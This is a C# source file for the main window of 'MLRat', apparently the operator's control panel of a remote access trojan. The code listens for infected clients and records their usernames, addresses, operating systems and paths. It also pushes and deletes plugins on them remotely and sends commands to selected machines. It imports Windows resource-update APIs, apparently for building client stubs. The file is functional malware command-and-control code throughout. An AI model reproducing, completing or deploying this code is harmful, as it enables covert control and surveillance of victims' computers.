using MLRat.Plugin;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using MLRat.Networking;
using System.Diagnostics;
using MLRat.Cryptography;
using MLRat.Server;
using System.Threading;
using MLRat.Handlers;
using ServerPlugin.InterfaceHandle;
using System.Runtime.InteropServices;

namespace MLRat.Forms
{
    public partial class MainWindow : Form
    {
        private eSock.Server NetworkServer;
        private Dictionary<Guid, MLPlugin> LoadedPlugins = new Dictionary<Guid, MLPlugin>();
        //private HashSet<Guid> ClientID = new HashSet<Guid>();
        private Dictionary<Guid, MLClientData> ConnectedClients = new Dictionary<Guid, MLClientData>();
        public MainWindow()
        {
            InitializeComponent();
            DirectoryInfo id = new DirectoryInfo("Plugins");
            if (id.Exists)
            {
                foreach (FileInfo pluginFile in id.GetFiles("*.MLP"))
                {
                    LoadPlugin(pluginFile.FullName);
                }
            }
        }

        private Guid GetUniqueID()
        {
            Guid id = Guid.NewGuid();
            while(ConnectedClients.ContainsKey(id))
                id = Guid.NewGuid();
            return id;
        }


        void DisplayException(MLPlugin plugin, Exception ex)
        {
            if (plugin != null)
            {
                Console.WriteLine("{0}: {1}", plugin.ClientPluginID, ex.ToString());
            }
            else
            {
                Console.WriteLine(ex.ToString());
            }
        }

        void LoadPlugin(string path)
        {
            MLPlugin _plugin = null;
            try
            {
                byte[] PluginBytes = File.ReadAllBytes(path);
                _plugin = new MLPlugin(PluginBytes);
                if (!_plugin.Load())
                    throw new Exception("Failed to load plugin");
                if (_plugin.ClientPluginID == Guid.Empty)
                    throw new Exception("Invalid plugin ID");
                if (LoadedPlugins.ContainsKey(_plugin.ClientPluginID))
                    throw new Exception("Client plugin ID match");
                pluginDisplay _display = new pluginDisplay(_plugin);
                _display.Parent = pluginPanel;
                _display.Width = pluginPanel.Width;
                _display.Anchor = AnchorStyles.Left | AnchorStyles.Right | AnchorStyles.Top;
                _display.Location = new Point(0, LoadedPlugins.Count*_display.Height);
                pluginPanel.Controls.Add(_display);
                LoadedPlugins.Add(_plugin.ClientPluginID, _plugin);
                Console.WriteLine("Loaded plugin: {0}", _plugin.ClientPluginID.ToString("n"));
                _plugin.ServerPlugin.OnPluginLoad(new MLUiHost(_plugin, OncontextAdd, OnColumnAdd));
            }
            catch(Exception ex)
            {
                DisplayException(_plugin, ex);
            }
        }

        IMLRatColumn OnColumnAdd(MLPlugin _plugin, string name, string defaultValue)
        {
            lock(this)
            {
                MLRatColumn column = new MLRatColumn(OnColumnUpdate);
                column.Parent = _plugin;
                ColumnHeader header = clientList.Columns.Add(name);
                column.Index = header.Index;
                header.Tag = defaultValue;
                /*
                Invoke((MethodInvoker)delegate ()
                {
                    foreach (ListViewItem clientItem in clientList.Items)
                    {
                        if(clientItem.SubItems.Count-1 < header.Index)
                            clientItem.SubItems.Add(defaultValue);
                    }
                });
               */
                Console.WriteLine("added column: {0}", name);
                return column;
            }
        }

        void OnColumnUpdate(MLRatColumn sender, MLPlugin plugin, IClient client, string value)
        {
            try
            {
                MLClientData d = ConnectedClients[client.ID];
                ListViewItem i = (ListViewItem)d.DisplayObject;
                EditSubitem(i, sender.Index, value);
            }
            catch(Exception ex)
            {
                DisplayException(plugin, ex);
            }
        }

        void EditSubitem(ListViewItem i, int index, string value)
        {
            Invoke((MethodInvoker)delegate ()
            {
                if (index < clientList.Columns.Count)
                {
                    i.SubItems[index].Text = value;
                }
                
            });
        }

        void OncontextAdd(MLPlugin _plugin, MLRatContextEntry entry)
        {
            ToolStripMenuItem _baseItem = new ToolStripMenuItem();
            _baseItem.Text = entry.Text;
            _baseItem.Tag = new MLContextData()
            {
                Plugin = _plugin,
                ContextData = entry
            };
            if (entry.OnClick != null)
                _baseItem.Click += ContextMenu_Click;
            if(entry.SubMenus != null)
            {
                foreach (var subentry in entry.SubMenus)
                    AddMenuItem(_plugin, _baseItem, subentry);
            }
            ClientContextStrip.Items.Add(_baseItem);
        }

        void AddMenuItem(MLPlugin _plugin, ToolStripMenuItem parent, MLRatContextEntry entry)
        {
            ToolStripMenuItem _menu = new ToolStripMenuItem();
            _menu.Text = entry.Text;
            _menu.Tag = new MLContextData()
            {
                Plugin = _plugin,
                ContextData = entry
            };
            if (entry.OnClick != null)
                _menu.Click += ContextMenu_Click;
            if (entry.SubMenus != null)
            {
                foreach (var subentrys in entry.SubMenus)
                    AddMenuItem(_plugin, _menu, subentrys);
            }
            parent.DropDownItems.Add(_menu);
        }

        void ContextMenu_Click(object sender, EventArgs e)
        {
            MLPlugin plugin = null;
            try
            {
                ToolStripMenuItem _menu = (ToolStripMenuItem) sender;
                MLContextData _entry = (MLContextData)_menu.Tag;
                plugin = _entry.Plugin;
                _entry.ContextData.OnClick(SelectedClients(plugin));
            }
            catch(Exception ex)
            {
                DisplayException(plugin, ex);
            }
        }

        IClient[] SelectedClients(MLPlugin _plugin)
        {
            List<IClient> _selectedClients = new List<IClient>();
            foreach (ListViewItem i in clientList.SelectedItems)
            {
                try
                {
                    this.Invoke((MethodInvoker) delegate()
                    {
                        MLClientData _client = (MLClientData) i.Tag;
                        _selectedClients.Add(new MLClient(_client.ID, _plugin.ClientPluginID, _client.ClientSocket));
                    });
                }
                catch(Exception ex)
                {
                    DisplayException(_plugin, ex);
                }
            }
            return _selectedClients.ToArray();
        }

        private void MainWindow_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            NetworkServer = new eSock.Server();
            NetworkServer.BufferSize = 1000000;//1mb
            NetworkServer.OnClientConnect += NetworkServer_OnClientConnect;
            NetworkServer.OnClientConnecting += NetworkServer_OnClientConnecting;
            NetworkServer.OnClientDisconnect += NetworkServer_OnClientDisconnect;
            NetworkServer.OnDataRetrieved += NetworkServer_OnDataRetrieved;
            if (NetworkServer.Start((int)numericUpDown1.Value))
            {
                this.Text += ": " + numericUpDown1.Value.ToString();
                button1.Enabled = false;
                numericUpDown1.Enabled = false;
            }
            else
            {
                MessageBox.Show("Failed to listen");
            }
        }

        #region " Network callbacks "

        void NetworkServer_OnDataRetrieved(eSock.Server sender, eSock.Server.eSockClient client, object[] data)
        {
            lock (client)
            {
                try
                {
                    MLClientData _ClientData = (MLClientData) client.Tag;
                    Guid PluginID = (Guid) data[0];
                    if (PluginID == Guid.Empty)
                    {
                        NetworkPacket command = (NetworkPacket)data[1];
                        Debug.WriteLine(command, "Command");
                        if (!_ClientData.Handshaken)
                        {
                            
                            if (command == NetworkPacket.Handshake)
                            {
                                string addUsername = (string) data[2];
                                string OS = (string)data[3];
                                _ClientData.Handshaken = true;
                                _ClientData.Encryption.GenerateRandomKey();
                                client.Send(Guid.Empty, (byte)NetworkPacket.Connect, _ClientData.Encryption.Key);
                                _ClientData.Encryption.Enabled = true;
                                return;
                            }
                            return;
                        }

                        if(command == NetworkPacket.BasicSettingsUpdated)
                        {
                            Debug.WriteLine("Basic settings updated", "Settings");
                            ListViewItem i = new ListViewItem(_ClientData.Settings.GetSetting<string>("Username", "Default"));
                            i.Tag = _ClientData;

                            i.SubItems.Add(client.NetworkSocket.RemoteEndPoint.ToString());
                            i.SubItems.Add(_ClientData.Settings.GetSetting<string>("OS", "WinX Lollypop (Unknowen)"));
                            i.SubItems.Add(_ClientData.Settings.GetSetting<string>("Cores", "0"));
                            i.SubItems.Add(_ClientData.Settings.GetSetting<string>("Path", ""));

                            _ClientData.DisplayObject = i;
                            AddListview(i);
                            foreach (var plugin in LoadedPlugins)
                            {
                                try
                                {
                                    plugin.Value.ServerPlugin.OnClientConnect(new MLClient(_ClientData.ID, plugin.Value.ClientPluginID,
                                    client));
                                }
                                catch (Exception ex)
                                {
                                    DisplayException(plugin.Value, ex);
                                }
                            }
                        }

                        if(command == NetworkPacket.UpdateSetting)
                        {
                            string settingName = (string)data[2];
                            object value = data[3];
                            _ClientData.Settings.UpdateSetting(settingName, value);
                            Debug.WriteLine(string.Format("Updated {0}", settingName), "Settings");
                        }

                        if(command == NetworkPacket.UpdateSettingsDictionary)
                        {
                            var settings = (Dictionary< string, object>)data[2];
                            foreach(var dcItem in settings)
                            {
                                _ClientData.Settings.UpdateSetting(dcItem.Key, dcItem.Value);
                            }
                        }


                        #region " Plugin Checksum "
                        
                        if (command == NetworkPacket.Checksums)
                        {
                            bool Updated = false;
                            Dictionary<Guid, string> Checksums = (Dictionary<Guid, string>)data[2];
                            if (Checksums == null)
                            {
                                foreach (var plugin in LoadedPlugins)
                                {
                                    Guid ID = plugin.Key;
                                    UpdatePlugin(client, ID);
                                    Updated = true;
                                }
                                return;
                            }
                            foreach (var plugin in Checksums)
                            {
                                Guid ID = plugin.Key;
                                string checksum = plugin.Value;
                                if (!LoadedPlugins.ContainsKey(ID))
                                {
                                    client.Send(Guid.Empty, (byte)NetworkPacket.DeletePlugin, ID);
                                    Updated = true;
                                    continue;
                                }
                                if (LoadedPlugins[ID].ClientPluginChecksum!= checksum)
                                {
                                    UpdatePlugin(client, ID);
                                    Updated = true;
                                }
                                 
                            }

                            foreach (var plugin in LoadedPlugins)
                            {
                                Guid ID = plugin.Key;
                                MLPlugin PluginData = plugin.Value;
                                if (!Checksums.ContainsKey(ID))
                                {
                                    UpdatePlugin(client, ID);
                                    Updated = true;
                                }
                            }
                            if (Updated)
                                client.Send(Guid.Empty, (byte)NetworkPacket.Restart);
                            else
                                client.Send(Guid.Empty, (byte)NetworkPacket.PluginsVerified);
                            _ClientData.PluginsVerified = true;
                            
                        }

                        #endregion

                        return;
                    }
                    if (LoadedPlugins.ContainsKey(PluginID))
                    {
                        LoadedPlugins[PluginID].ServerPlugin.OnDataRetrieved(new MLClient(_ClientData.ID, PluginID,
                            client), (object[]) data[1]);
                    }
                }
                catch(Exception ex)
                {
                    DisplayException(null, ex);
                }
            }
        }

        void UpdatePlugin(eSock.Server.eSockClient client, Guid ID)
        {
            try
            {
                byte[] buffer = new byte[10000];
                int bytesRead = 0;
                using (MemoryStream _pluginUpdate = new MemoryStream(LoadedPlugins[ID].ClientPluginBytes))
                {
                    while ((bytesRead = _pluginUpdate.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        byte[] Packet = new byte[bytesRead];
                        Array.Copy(buffer, 0, Packet, 0, bytesRead);
                        client.Send(Guid.Empty, (byte)NetworkPacket.UpdatePlugin, ID, Packet,
                            _pluginUpdate.Position == _pluginUpdate.Length);
                        Thread.Sleep(100);
                    }
                }
            }
            catch(Exception ex)
            {
                if (LoadedPlugins.ContainsKey(ID))
                    DisplayException(LoadedPlugins[ID], ex);
                else
                    DisplayException(null, ex);
            }
        }

        void AddListview(ListViewItem lv)
        {
            this.Invoke((MethodInvoker) delegate()
            {
                foreach(ColumnHeader header in clientList.Columns)
                {
                    if(lv.SubItems.Count == header.Index)
                    {
                        lv.SubItems.Add((string)header.Tag);
                    }
                }
                clientList.Items.Add(lv);
            });
        }
        void RemoveListView(ListViewItem lv)
        {
            this.Invoke((MethodInvoker)delegate()
            {
                clientList.Items.Remove(lv);
            });
        }

        void NetworkServer_OnClientDisconnect(eSock.Server sender, eSock.Server.eSockClient client, System.Net.Sockets.SocketError ER)
        {
            MLClientData _ClientData = (MLClientData)client.Tag;
            RemoveListView((ListViewItem)_ClientData.DisplayObject);
            if (ConnectedClients.ContainsKey(_ClientData.ID))
                ConnectedClients.Remove(_ClientData.ID);
            foreach (var plugin in LoadedPlugins)
            {
                try
                {
                    plugin.Value.ServerPlugin.OnClientDisconnect(new MLClient(_ClientData.ID,
                        plugin.Value.ClientPluginID,
                        client));
                }
                catch(Exception ex)
                {
                    DisplayException(plugin.Value, ex);
                }
            }
        }

        bool NetworkServer_OnClientConnecting(eSock.Server sender, System.Net.Sockets.Socket cSock)
        {
            return true;
        }

        void NetworkServer_OnClientConnect(eSock.Server sender, eSock.Server.eSockClient client)
        {
            MLClientData _ClientData = new MLClientData(GetUniqueID(), client);
            ConnectedClients.Add(_ClientData.ID, _ClientData);
            client.Tag = _ClientData;
        }

        #endregion


        #region " WinApi "

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr BeginUpdateResource(string pFileName,
       [MarshalAs(UnmanagedType.Bool)]bool bDeleteExistingResources);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool UpdateResource(IntPtr hUpdate, string lpType, string lpName, ushort wLanguage, IntPtr lpData, uint cbData);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool EndUpdateResource(IntPtr hUpdate, bool fDiscard);

        #endregion
    }
}
